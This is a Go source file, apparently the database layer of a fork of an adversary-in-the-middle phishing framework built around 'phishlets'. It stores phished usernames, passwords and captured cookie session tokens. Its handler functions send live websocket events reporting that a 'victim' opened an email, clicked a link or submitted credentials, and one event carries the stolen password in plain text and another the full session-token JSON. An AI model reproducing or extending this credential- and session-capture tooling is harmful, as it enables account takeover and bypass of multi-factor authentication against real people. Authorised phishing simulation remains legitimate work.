package database

import (
	"encoding/json"
	"strconv"
	"github.com/gorilla/websocket"
	"time"

	"github.com/tidwall/buntdb"
)

type FeedEvent struct {
	Event   string `json:"event"`
	Time    string `json:"time"`
	Message string `json:"message"`
	Tokens  string `json:"tokens"`
}

type Database struct {
	path string
	db   *buntdb.DB
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func HandleEmailOpened(rid string, browser map[string]string, livefeed bool) error {
	if !livefeed {
		return nil
	}
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()
	fe := FeedEvent{}
	fe.Event = "Email Opened"
	fe.Message = "Email has been opened by victim: **" + browser["email"] + "**"
	fe.Time = time.Now().String()
	data, _ := json.Marshal(fe)
	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func HandleClickedLink(rid string, browser map[string]string, livefeed bool) error {
	if !livefeed {
		return nil
	}
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()
	fe := FeedEvent{}
	fe.Event = "Clicked Link"
	fe.Message = "Link has been clicked by victim: **" + browser["email"] + "**"
	fe.Time = time.Now().String()
	data, _ := json.Marshal(fe)
	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func HandleSubmittedData(rid string, username string, password string, browser map[string]string, livefeed bool) error {
	if !livefeed {
		return nil
	}
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()
	fe := FeedEvent{}
	fe.Event = "Submitted Data"
	fe.Message = "Victim **" + browser["email"] + "** has submitted data! Username: " + username + " Password: " + password
	fe.Time = time.Now().String()
	data, _ := json.Marshal(fe)
	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func HandleCapturedCookieSession(rid string, tokens map[string]map[string]*CookieToken, browser map[string]string, livefeed bool) error {
	if !livefeed {
		return nil
	}
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()
	fe := FeedEvent{}
	fe.Event = "Captured Session"
	fe.Message = "Captured session for victim: **" + browser["email"] + "**! View full token JSON below!"
	fe.Time = time.Now().String()
	json_tokens, _ := json.Marshal(tokens)
	fe.Tokens = string(json_tokens)
	data, _ := json.Marshal(fe)
	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func HandleCapturedOtherSession(rid string, tokens map[string]string, browser map[string]string, livefeed bool) error {
	if !livefeed {
		return nil
	}
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()
	fe := FeedEvent{}
	fe.Event = "Captured Session"
	fe.Message = "Captured session for victim: **" + browser["email"] + "**! View full token JSON below!"
	fe.Time = time.Now().String()
	json_tokens, _ := json.Marshal(tokens)
	fe.Tokens = string(json_tokens)
	data, _ := json.Marshal(fe)
	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionTmsgid(sid string, tmsgid string) error {
	err := d.sessionsUpdateTmsgid(sid, tmsgid)
	return err
}

func (d *Database) SetSessionCmsgid(sid string, cmsgid string) error {
	err := d.sessionsUpdateCmsgid(sid, cmsgid)
	return err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateBodyTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateHttpTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	err := d.sessionsUpdateCookieTokens(sid, tokens)
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
